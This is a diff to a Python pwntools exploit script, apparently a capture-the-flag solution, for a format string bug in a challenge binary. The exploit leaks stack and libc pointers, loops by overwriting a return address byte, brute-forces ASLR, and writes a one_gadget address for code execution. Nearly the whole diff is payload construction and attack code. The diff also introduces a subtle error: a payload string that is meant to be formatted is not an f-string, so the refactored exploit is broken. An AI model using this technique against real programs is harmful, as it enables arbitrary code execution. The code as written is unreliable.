@@ -1,7 +1,12 @@
 """
 Use format string vulnerability to leak pointers and overwrite last byte of return 
 address, allowing us to loop. On subsequent iterations, use our new knowledge of the
-stack and libc to overwrite the return address of main with a one gadget
+stack and libc to overwrite the return address of main with a one_gadget.
+
+Things are tricky here because the format string itself isn't on the stack, so the
+normal method of exploiting this doesn't work. Instead, use pointers to pointers on
+the stack to set up our write what were 
+(https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/)
 
 4 bits of ASLR on the return address overwrite, so 1/16
 """
@@ -61,23 +66,28 @@ ONE_GADGET_OFFSET = 0x10a45c
 def exploit(io):
     io.recvuntil("> ")
     
+    # Number of characters printed by the leading "%p%p%p..." string
     prefix_length = 78
     
-    fuck_return_addr = 0x88 # 4 bits of ASLR here
+    fuck_return_addr = 0x88 # 4 bits of ASLR here. The function is named fuck()
 
     # Cop out for GDB
     if args.GDB:
         fuck_return_addr = int(input("Return addr: "), 0)
 
-    # Leak and re-rerun
+    # Calculate format string that will overwrite a pointer on the stack, to (hopefully)
+    # point to fucks() return address
     curr_len = prefix_length
     fuck_return_num = ((0xff - curr_len) + (fuck_return_addr & 0xff) + 1) & 0xff
+    loop_payload = "%p%p%p%p%p%p%p%{fuck_return_num}c%hhn"
+
+    # Leak and re-run
     curr_len += fuck_return_num
     addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
-    io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn%{addr_overwrite_num}c%7$hhn.%9$p.%17$p.A\0")
+    io.sendline(f"{loop_payload}%{addr_overwrite_num}c%7$hhn.%9$p.%17$p.A\0")
     io.recvuntil("> ")
     
-    # Parse out info from the mess that just got output
+    # Parse out info from the mess that just got spit out
     leak = io.recvuntil(".")
     leak = io.clean(timeout=0.5).split(b".") 
     output = leak[-1]
@@ -94,7 +104,7 @@ def exploit(io):
     print(f"STACK: {hex(stack_leak)}")
    
     # If everything worked, then we're back in the fuck() function, so we should have
-    # another prompt. If we don't, we guessed wrong on the ASLR
+    # another prompt. If we don't, we were unlucky on the ASLR
     if b">" not in output:
         print("*** ASLR WRONG ***")
         raise Error("BAD ASLR")
@@ -108,7 +118,7 @@ def exploit(io):
         target_overwrite_num = ((size_mask - curr_len) + (target & size_mask) + 1) & size_mask
         curr_len += target_overwrite_num
         ret_addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
-        io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn" + "%p"*8 + f"%{target_overwrite_num}c"  + "%hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
+        io.sendline(loop_payload + "%p"*8 + f"%{target_overwrite_num}c"  + "%hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
         io.recvuntil("> ")
         io.recvuntil("> ")
 
@@ -119,7 +129,7 @@ def exploit(io):
         data_num = ((0xffff - curr_len) + (data) + 1) & 0xffff
         curr_len += data_num
         ret_addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
-        io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn" + f"%{data_num}c%45$hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
+        io.sendline(loop_payload + f"%{data_num}c%45$hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
         io.recvuntil("> ")
         io.recvuntil("> ")
 
